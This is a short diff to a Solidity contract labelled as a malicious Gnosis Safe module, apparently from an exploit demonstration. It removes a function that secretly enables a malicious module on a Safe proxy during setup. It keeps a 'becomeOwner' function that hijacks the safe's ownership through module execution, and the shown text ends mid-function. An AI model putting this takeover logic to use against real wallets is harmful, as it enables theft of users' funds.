@@ -8,16 +8,7 @@ import "./Exploit.sol";
 /* Malicious Gnosis Safe Module
  * @notice UNSAFE CODE - DO NOT USE IN PRODUCTION
  */
-contract ControllerModule is ModuleManager {
-    // called during Gnosis Safe initiation
-    // it uses the precomputed proxy address to install a malicious module for Gnosis Safe
-    function installModule(address _exploitContract) external {
-        Exploit exploit = Exploit(_exploitContract);
-        GnosisSafe _gnosisSafe = GnosisSafe(payable(exploit.computedProxyAddress()));
-        _gnosisSafe.enableModule(address(exploit.controllerModule()));
-        console.log("Malicious Module Installed.");
-    }
-
+contract ControllerModule {
     //function to change safe owner
     function becomeOwner(address proxy, address currentOwner) public {
         GnosisSafe(payable(proxy)).execTransactionFromModule(
